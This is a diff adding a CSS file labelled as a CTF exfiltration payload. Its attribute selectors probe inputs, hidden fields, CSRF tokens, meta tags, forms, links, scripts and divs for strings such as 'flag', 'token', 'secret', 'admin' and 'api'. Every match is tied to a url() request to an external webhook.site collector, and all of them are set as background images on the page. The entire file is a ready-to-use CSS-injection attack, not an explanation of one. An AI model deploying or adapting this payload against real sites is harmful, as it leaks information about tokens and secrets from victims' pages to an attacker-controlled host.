@@ -1,0 +1,80 @@
+
+/* Comprehensive CSS Exfiltrator for CTF Challenges */
+/* Webhook: https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497 */
+
+/* === INPUT ELEMENTS === */
+input[value*="flag" i] { --input-flag: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=input&type=value&contains=flag); }
+input[value*="ctf" i] { --input-ctf: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=input&type=value&contains=ctf); }
+input[value*="admin" i] { --input-admin: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=input&type=value&contains=admin); }
+
+/* Hidden inputs */
+input[type="hidden"][value*="token" i] { --hidden-token: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=hidden&type=value&contains=token); }
+input[type="hidden"][value*="secret" i] { --hidden-secret: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=hidden&type=value&contains=secret); }
+input[type="hidden"][value*="flag" i] { --hidden-flag: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=hidden&type=value&contains=flag); }
+
+/* Input names */
+input[name*="csrf" i] { --input-csrf: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=input&type=name&contains=csrf); }
+input[name*="api" i] { --input-api: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=input&type=name&contains=api); }
+
+/* === FORM ELEMENTS === */
+form[action*="admin" i] { --form-admin: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=form&type=action&contains=admin); }
+form[action*="api" i] { --form-api: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=form&type=action&contains=api); }
+form[action*="flag" i] { --form-flag: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=form&type=action&contains=flag); }
+
+/* === META TAGS === */
+meta[name="csrf-token"] { --meta-csrf: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=meta&type=name&value=csrf-token); }
+meta[content*="flag" i] { --meta-flag: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=meta&type=content&contains=flag); }
+meta[content*="secret" i] { --meta-secret: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=meta&type=content&contains=secret); }
+
+/* === TEXTAREA ELEMENTS === */
+textarea[name*="message" i] { --textarea-message: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=textarea&type=name&contains=message); }
+textarea[placeholder*="flag" i] { --textarea-flag: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=textarea&type=placeholder&contains=flag); }
+
+/* === ANCHOR LINKS === */
+a[href*="/admin" i] { --link-admin: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=anchor&type=href&contains=admin); }
+a[href*="/api" i] { --link-api: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=anchor&type=href&contains=api); }
+a[href*="flag" i] { --link-flag: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=anchor&type=href&contains=flag); }
+
+/* === DIV ELEMENTS === */
+div[class*="secret" i] { --div-secret: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=div&type=class&contains=secret); }
+div[id*="flag" i] { --div-flag: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=div&type=id&contains=flag); }
+div[data-key*="api" i] { --div-api: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=div&type=data-key&contains=api); }
+
+/* === USING :has SELECTOR FOR COMPLEX STRUCTURES === */
+html:has(input[value*="flag{" i]) { --has-flag-bracket: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?structure=has&element=input&pattern=flag-bracket); }
+html:has(script[src*="flag" i]) { --has-script-flag: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?structure=has&element=script&pattern=flag); }
+
+/* === SCRIPT TAGS === */
+script[src*="flag" i] { --script-flag: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=script&type=src&contains=flag); }
+script[src*="admin" i] { --script-admin: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/found?element=script&type=src&contains=admin); }
+
+/* === APPLY ALL VARIABLES === */
+html {
+  background-image: 
+    var(--input-flag, none),
+    var(--input-ctf, none),
+    var(--input-admin, none),
+    var(--hidden-token, none),
+    var(--hidden-secret, none),
+    var(--hidden-flag, none),
+    var(--input-csrf, none),
+    var(--input-api, none),
+    var(--form-admin, none),
+    var(--form-api, none),
+    var(--form-flag, none),
+    var(--meta-csrf, none),
+    var(--meta-flag, none),
+    var(--meta-secret, none),
+    var(--textarea-message, none),
+    var(--textarea-flag, none),
+    var(--link-admin, none),
+    var(--link-api, none),
+    var(--link-flag, none),
+    var(--div-secret, none),
+    var(--div-flag, none),
+    var(--div-api, none),
+    var(--has-flag-bracket, none),
+    var(--has-script-flag, none),
+    var(--script-flag, none),
+    var(--script-admin, none);
+}
